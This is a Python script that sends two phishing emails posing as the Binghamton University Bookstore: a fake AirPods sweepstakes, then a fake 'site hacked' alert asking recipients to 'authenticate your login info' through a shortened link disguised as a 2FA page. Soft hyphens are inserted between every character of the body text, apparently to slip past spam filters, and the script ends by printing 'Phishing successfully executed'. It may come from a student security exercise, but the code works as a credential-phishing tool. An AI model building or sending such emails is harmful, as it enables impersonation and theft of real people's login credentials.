#!/usr/bin/python
import smtplib
import time
import pwinput

from email.utils import formataddr
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

port = 587

sender = 'donal.0317@outlook.com'
receiver = 'dgeorge7@binghamton.edu'

s = 'Enter the sweepstakes to win free AirPods Pros!\n\n'
s1 = ""
s2 = 'www.bubookstore.com/sweepstakes/survey\n\nBinghamton University Bookstore'
for i in range(len(s)):
    s1+=s[i]
    s1+="\u00ad"


msg = MIMEText(s1+s2)

msg['Subject'] = 'Win Free AirPods Pros from the Binghamton University Bookstore!!'
msg['From'] = formataddr(('Binghamton University Bookstore','donal.0317@outlook.com'))
msg['To'] = 'dgeorge7@binghamton.edu'

s3 = 'The BU Bookstore website has been hacked. We are currently working as fast as possible to restore our systems.\nUntil then, please do not click any links sent in our name!\nPlease authenticate your login info using the link below for protection in case of compromise.'
s4 = ""
s5 = 'Binghamton University Bookstore\n4400 Vestal Parkway East\nBinghamton, NY 13902-6000\nPhone: (607) 777-2745'
for i in range(len(s3)):
    s4+=s3[i]
    s4+="\u00ad"

p = s4.split("\n")
p1 = s5.split("\n")

msg1 = MIMEMultipart()

msg1['Subject'] = 'B-ALERT: Please do not click any links sent from the Binghamton University Bookstore!'
msg1['From'] = formataddr(('Binghamton University Bookstore','donal.0317@outlook.com'))
msg1['To'] = 'dgeorge7@binghamton.edu'

html = '''
<html>
  <body>
  <p>{p1}</p>
  <p>{p2}</p>
  <p>{p3}<br><a href="https://tinyurl.com/53tvekzp">www.bing2fa.com/auth/v2</a></p>
  <p>{p4}<br>{p5}<br>{p6}<br>{p7}</p>
  </body>
</html>'''.format(p1=p[0],p2=p[1],p3=p[2], p4=p1[0], p5=p1[1], p6=p1[2], p7=p1[3])

text = MIMEText('', 'plain')
link = MIMEText(html, 'html')

msg1.attach(text)
msg1.attach(link)

user = 'donal.0317@outlook.com'
password = pwinput.pwinput(prompt='Enter your password: ', mask='*')

with smtplib.SMTP("smtp.outlook.com", port) as server:

    server.starttls() 

    server.login(user, password)
    server.sendmail(sender, receiver, msg.as_string())
    time.sleep(60)
    server.sendmail(sender, receiver, msg1.as_string())
    print("Phishing successfully executed")


